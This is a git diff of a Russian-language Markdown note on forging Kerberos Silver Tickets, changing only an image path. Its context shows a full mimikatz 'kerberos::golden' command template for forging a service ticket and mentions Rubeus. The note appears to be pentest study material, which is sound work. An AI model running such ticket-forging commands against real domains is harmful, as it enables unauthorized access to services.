@@ -105,7 +105,7 @@ Service Ticket, выпущенный злоумышленником, можно 
 
 `mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"`
 
-![](st4.png)
+![](../../../Attachments/st4.png)
 
 С помощью Rubeus:
 
